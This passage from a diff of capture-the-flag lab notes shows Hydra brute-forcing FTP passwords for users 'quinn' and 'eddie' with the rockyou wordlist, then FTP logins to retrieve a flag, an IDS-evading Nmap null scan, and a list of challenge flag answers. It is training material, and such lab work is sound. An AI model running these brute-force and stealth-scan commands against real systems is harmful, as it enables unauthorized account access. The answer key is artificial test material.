@@ -187,3 +187,193 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-31 13:21:
 [ATTEMPT] target 10.10.26.227 - login "quinn" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
 [ATTEMPT] target 10.10.26.227 - login "quinn" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
 [ATTEMPT] target 10.10.26.227 - login "quinn" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "654321" - 17 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "michael" - 18 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "ashley" - 19 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "111111" - 21 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "iloveu" - 22 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "000000" - 23 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "michelle" - 24 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "tigger" - 25 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "sunshine" - 26 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "chocolate" - 27 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "password1" - 28 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "soccer" - 29 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "anthony" - 30 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "friends" - 31 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "butterfly" - 32 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "purple" - 33 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "angel" - 34 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "jordan" - 35 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "liverpool" - 36 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "justin" - 37 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "loveme" - 38 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "fuckyou" - 39 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "123123" - 40 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "football" - 41 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "secret" - 42 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "andrea" - 43 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "carlos" - 44 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "jennifer" - 45 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "joshua" - 46 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "bubbles" - 47 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "1234567890" - 48 of 14344399 [child 14] (0/0)
+[10021][ftp] host: 10.10.26.227   login: quinn   password: andrea
+[STATUS] attack finished for 10.10.26.227 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-31 13:21:24
+
+quinn:andrea
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -t 16 -l eddie -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.26.227:10021
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-31 13:22:40
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.26.227:10021/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "654321" - 17 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "michael" - 18 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "ashley" - 19 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "111111" - 21 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "iloveu" - 22 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "000000" - 23 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "michelle" - 24 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "tigger" - 25 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "sunshine" - 26 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "chocolate" - 27 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "password1" - 28 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "soccer" - 29 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "anthony" - 30 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "friends" - 31 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "butterfly" - 32 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "purple" - 33 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "angel" - 34 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "jordan" - 35 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "liverpool" - 36 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "justin" - 37 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "loveme" - 38 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "fuckyou" - 39 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "123123" - 40 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "football" - 41 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "secret" - 42 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "andrea" - 43 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "carlos" - 44 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "jennifer" - 45 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "joshua" - 46 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "bubbles" - 47 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.26.227 - login "eddie" - pass "1234567890" - 48 of 14344399 [child 15] (0/0)
+[10021][ftp] host: 10.10.26.227   login: eddie   password: jordan
+[STATUS] attack finished for 10.10.26.227 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-31 13:22:53
+
+eddie:jordan
+```
+We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
+```text
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.26.227 10021
+Connected to 10.10.26.227.
+220 (vsFTPd 3.0.3)
+Name (10.10.26.227:kali): eddie
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||30110|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> quit
+221 Goodbye.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.26.227 10021
+Connected to 10.10.26.227.
+220 (vsFTPd 3.0.3)
+Name (10.10.26.227:kali): quinn
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||30835|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
+226 Directory send OK.
+ftp> get ftp_flag.txt
+local: ftp_flag.txt remote: ftp_flag.txt
+229 Entering Extended Passive Mode (|||30303|)
+150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
+100% |*****************************|    18        0.35 KiB/s    00:00 ETA
+226 Transfer complete.
+18 bytes received in 00:00 (0.06 KiB/s)
+ftp> quit
+221 Goodbye.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat ftp_flag.txt 
+THM{321452667098}
+```
+Browsing to http://10.10.26.227:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?
+```text
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sN 10.10.26.227
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 13:33 EDT
+Nmap scan report for 10.10.26.227
+Host is up (0.20s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE         SERVICE
+22/tcp   open|filtered ssh
+80/tcp   open|filtered http
+139/tcp  open|filtered netbios-ssn
+445/tcp  open|filtered microsoft-ds
+8080/tcp open|filtered http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
+```
+> 0 %
+Chance of scan being detected
+Your mission is to use Nmap to scan 10.10.26.227 (this machine)
+as covertly as possible and avoid being detected by the IDS.
+### Summary
+Congratulations. In this module, we have learned about passive reconnaissance, active reconnaissance, Nmap, protocols and services, and attacking logins with Hydra.
+Time to continue your journey with a new module. *No answer needed*
+
+## Flags / Answers
+- ***THM{web_server_25352}***
+- ***THM{946219583339}***
+- ***THM{321452667098}***
+- Exercise Complete! Task answer: **THM{f7443f99}**
+- ***THM{f7443f99}***
+
+## Notes / Lessons Learned
+[[Protocols and Servers 2]]
+
